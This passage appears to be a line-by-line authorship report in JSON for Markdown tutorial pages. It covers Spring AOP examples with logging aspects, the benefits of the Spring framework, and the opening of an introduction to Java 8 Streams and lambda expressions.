        "content": "It provides ways to dynamically add the cross-cutting concerns before, after or around the actual logic using simple"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "0blivious"
        },
        "content": "pluggable configurations. "
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "0blivious"
        },
        "content": "For example, say we wish to log something into the console everytime before we call the method `getEmployeeById`."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "0blivious"
        },
        "content": "We can then write aspect class annotated with `@Aspect` annotation and write point-cut expressions to log program information from"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"Join point is a point of execution of the program, such as the execution of a method or the handling of an exception.\"\u003e"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003ejoint-point\u003c/i\u003e"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/tooltip\u003e methods."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```java"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "0blivious"
        },
        "content": "@Aspect"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "0blivious"
        },
        "content": "public class EmployeeCRUDAspect {"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    @Before(\"execution(* EmployeeManager.getEmployeeById(..))\") // point-cut expressions"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public void logBefore(JoinPoint joinPoint) {"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        System.out.println(\"EmployeeCRUDAspect.logBefore() : \""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "0blivious"
        },
        "content": "                + joinPoint.getSignature().getName());"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    "
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    @After(\"execution(* EmployeeManager.getEmployeeById(..))\") // point-cut expressions"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public void logAfter(JoinPoint joinPoint) {"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        System.out.println(\"EmployeeCRUDAspect.logAfter() : \""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "0blivious"
        },
        "content": "                + joinPoint.getSignature().getName());"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "0blivious"
        },
        "content": "}"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    "
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "0blivious"
        },
        "content": "And the corresponding `EmployeeManager.java` file could be:"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```java"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "0blivious"
        },
        "content": "@Component"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "0blivious"
        },
        "content": "public class EmployeeManager {"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    public EmployeeDTO getEmployeeById(Integer employeeId) {"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        System.out.println(\"Method getEmployeeById() called\");"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        return new EmployeeDTO();"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    }"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "0blivious"
        },
        "content": "}"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "0blivious"
        },
        "content": "In the above example, `logBefore()` will be executed before the `getEmployeeById()` method because it matches the join point specified earlier."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Similarly, `logAfter()` will be executed after `getEmployeeById()`."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The output of the above code will be:"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "0blivious"
        },
        "content": "EmployeeCRUDAspect.logBefore() : getEmployeeById"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Method getEmployeeById() called"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "0blivious"
        },
        "content": "EmployeeCRUDAspect.logAfter() : getEmployeeById"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The declaration of aspects and"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"Advice is an action taken by an aspect at a particular join point.\"\u003e"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003eadvices \u003c/i\u003e"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/tooltip\u003ecould also be written directly in the XML templates. This makes the code more readable and"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "0blivious"
        },
        "content": "also allows for easier maintainance as we can add/remove concerns "
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "0blivious"
        },
        "content": "by changing XML configuration file without recompiling source code."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "0blivious"
        },
        "content": "For example, the above configuration could be written in a XML file as:"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```xml"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "0blivious"
        },
        "content": " \u003caop:config\u003e"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c!-- Spring AOP Pointcut definitions --\u003e"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003caop:pointcut id\u003d\"CRUDOperation\" expression\u003d\"execution(* EmployeeManager.*(..))\" /\u003e"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "0blivious"
        },
        "content": " "
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c!-- Spring AOP aspect 1 --\u003e"
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003caop:aspect id\u003d\"EmployeeCRUD\" ref\u003d\"crudAspectBean\"\u003e"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "0blivious"
        },
        "content": "             "
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        \u003c!-- Spring AOP advises --\u003e"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        \u003caop:before pointcut-ref\u003d\"CRUDOperation\" method\u003d\"logBefore\" /\u003e"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "0blivious"
        },
        "content": "        \u003caop:after pointcut-ref\u003d\"CRUDOperation\" method\u003d\"logAfter\" /\u003e"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "0blivious"
        },
        "content": "             "
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c/aop:aspect\u003e"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c!-- Spring AOP aspect instances --\u003e"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003cbean id\u003d\"crudAspectBean\" class\u003d\"com.aop.EmployeeCRUDAspect\" /\u003e"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "0blivious"
        },
        "content": "     "
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003c!-- Target Object --\u003e"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "0blivious"
        },
        "content": "    \u003cbean id\u003d\"employeeManager\" class\u003d\"com.aop.EmployeeManagerImpl\" /\u003e"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/aop:config\u003e"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "0blivious"
        },
        "content": "```"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Code sections above are adapted from [Spring AOP Tutorial Example](https://howtodoinjava.com/spring-aop-tutorial/) with slight modification."
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "0blivious"
        },
        "content": "## Why Use Spring?"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring makes programming Java quicker, easier, and safer. It enables you to"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "0blivious"
        },
        "content": "build applications from “plain old Java objects” (POJOs) and to apply enterprise services non-invasively to POJOs."
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Similar to other general Java frameworks (e.g. [Grails](https://grails.org/), [Play](https://www.playframework.com/)), Spring helps us focus on the core task rather than the boilerplate associated with it."
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Apart from that, Spring has several other advantages, described in the sections below:"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Benefit 1: Modularity"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring provides different modules to achieve different services and functionality for application development."
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "0blivious"
        },
        "content": "These modules are designed in such a way that no module is dependent on the others, except the Spring core module."
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Thus, we can optionally include one or more Spring projects depending on the need. This makes Spring lightweight"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "0blivious"
        },
        "content": "and require less configuration."
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "0blivious"
        },
        "content": "![Spring Framework Overview](spring-overview.png \"Overview of the Spring Framework\")"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "0blivious"
        },
        "content": "_Figure 1. Overview of the Spring Framework_"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Benefit 2: Easy Integration"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring is designed to be compatible with many other frameworks of Java, for example"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"Struts is an open source framework that extends the Java Servlet API and employs a Model, View, Controller (MVC) architecture.\"\u003e"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003eStruts \u003c/i\u003e"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/tooltip\u003eand"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ctooltip content\u003d\"Hibernate is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database.\"\u003e"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003ci\u003eHibernate\u003c/i\u003e"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/tooltip\u003e. It does not impose any restriction on the frameworks to be used together."
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Benefit 3: Strong Community Support"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring is an open source framework led by [Pivotal](https://tanzu.vmware.com/) Software and backed by a large consortium of organizations and individual"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "0blivious"
        },
        "content": "developers. This means that it remains relevant,"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "0blivious"
        },
        "content": "as evident by the ever increasing number of projects under its umbrella. "
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "0blivious"
        },
        "content": "### Benefit 4: Usability"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "0blivious"
        },
        "content": "One of the key aspects of any framework\u0027s popularity is how easy it is for developers to use it."
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Projects like [Spring Boot](https://spring.io/projects/spring-boot) have made bootstrapping a complex Spring project almost trivial."
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Spring thus is very easy to start but also powerful to extend to what programmers exactly need by providing multiple configuration options."
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Not to mention, it has excellent documentation and tutorials to help anyone get on-boarded."
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "0blivious"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "0blivious"
        },
        "content": "The official website is a great place to get started. It includes:"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Spring Quickstart Guide](https://spring.io/quickstart)"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Spring Projects Overview](https://spring.io/projects)"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "0blivious"
        },
        "content": "Here are some external resources that can be useful:"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Baeldung](https://www.baeldung.com/)"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Spring Tutorial](https://www.tutorialspoint.com/spring/index.htm)"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "0blivious"
        },
        "content": "If you need help with Spring, you can get support from Spring\u0027s community of millions of developers:"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Spring Community](https://spring.io/community)"
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Stack Overflow](https://stackoverflow.com/questions/tagged/spring)"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "0blivious"
        },
        "content": "- [Gitter](https://gitter.im/spring-projects/home)"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "0blivious"
        },
        "content": ""
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "0blivious"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "0blivious": 272
    }
  },
  {
    "path": "contents/java/streams-an-introduction.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Java 8 Streams - An Introduction"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  pageNav: 4"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Java 8 Streams - An Introduction"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: Lee Yi Min"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting Started](#getting-started)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Functional Interface and Lambda Expressions](#functional-interface-and-lambda-expressions)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Functional Interface](#functional-interface)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Method Reference](#method-reference)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Lambda Expressions](#lambda-expressions)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [An Example](#an-example)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [What is a stream?](#what-is-a-stream)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Building a Stream Pipeline](#building-a-stream-pipeline)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Constructing Streams](#constructing-streams)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Intermediate Operations](#intermediate-operations)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Filter](#filter)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Map](#map)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Terminal Operations](#terminal-operations)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Collect](#collect)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Drawbacks and Pitfalls](#drawbacks-and-pitfalls)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Long, complicated lambda expressions](#long-complicated-lambda-expressions)"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Difficulty in optimising stream performance](#difficulty-in-optimising-stream-performance)"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources](#resources)"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Functional Interfaces](#functional-interfaces)"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Method References](#method-references)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Lambda Expressions](#lambda-expressions)"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Stream](#stream)"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Common Pitfalls](#common-pitfalls)"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "In Java 8, we were introduced to new features such as lambda expressions and streams. If you weren\u0027t familiar with the concept of functional programming, you might be silently screaming in your head as you stare at a chunk of code infused with lambda expressions and stream operations."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "However, oftentimes, it\u0027s hard not to admire the conciseness of the codes utilising these features. For example, you might want to calculate the mean height of male students given a list of students. Using traditional for-loops, you may write something like this:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "double totalMaleHeight \u003d 0;"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "int noOfMales \u003d 0;"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "for (Student student: students) {"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "  if (student.isMale()) {"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    totalMaleHeight +\u003d student.getHeight();"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "    noOfMales++;"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "double meanMaleHeight \u003d totalMaleHeight / noOfMales;"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "However, with the power of the Stream API, you can write this instead!"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "double meanMaleHeight \u003d students.stream()"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "                                .filter(student -\u003e student.isMale())"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "                                .mapToDouble(student -\u003e student.getHeight())"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "                                .average()"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "                                .orElse(Double.NaN);"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "Not only is the numbers of lines reduced by almost half, the code utilising streams is also rather intuitive. First, we filter the students who are male, using a lambda expression (`student -\u003e student.isMale()`). Then, we get the heights of these students and followed by the average value of these heights. If the average value does not exist (which can happen when there are no male students), we store NaN in `meanMaleHeight` instead. The code is declarative and self-documenting, it\u0027s easy to understand what the original author was trying to achieve. This reduces the need for code comments, which we often see in loops since they can be harder to understand at a glance."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Besides its brevity, another cool feature of streams is that code can be executed in parallel using your multicore processor. Multiple students can be processed simultaneously, compared to processing only one student at a time with a normal loop. This can help to improve the performance of the operation significantly. And the best part is this can be done just by adding a simple method call in the Stream API, so you don\u0027t have implement multithreading or worry about how to go about splitting the work for it to work in parallel."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "It\u0027s okay if you have no experience in writing lambda expressions! This guide will step you through the basics of both lambda expressions and streams so that you can start utilising them."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "Before we can get started on Stream, it is imperative to first have some understanding on the concept of functional interface and lambda expressions. Feel free to skip right ahead if you are already familiar with such concepts! Then, let\u0027s take a closer look at the Stream API to get a better understanding of how it works."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "### Functional Interface and Lambda Expressions"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "#### Functional Interface"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "If you have tried using the Stream library and looked at its [API page](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html), you would see that many of its methods accept objects of new types such as `Predicate`, `Collector` and more. If you navigate into the APIs of these new types, you would have realised they are merely interfaces and the APIs themselves aren\u0027t giving much help on how you are supposed to make use of these interfaces."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "These interfaces are actually functional interfaces, which are simply __interfaces declared with a single abstract method__."
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "As these interfaces only have a single abstract method, when you provide a method reference or a lambda expression where a functional interface is required, the compiler is able to self-infer and instantiate an object of the required functional interface type, with the given method/lambda as the implementation of the abstract method. This is similar to instantiating an [anonymous class object](https://docs.oracle.com/javase/tutorial/java/javaOO/anonymousclasses.html), except that the code is more concise with the new syntax."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "#### Method Reference"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "So how can you provide a method reference? The syntax is simple : `\u003cclass/object/interface\u003e::\u003cmethod name\u003e`.  "
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "The method could be"
      },
      {
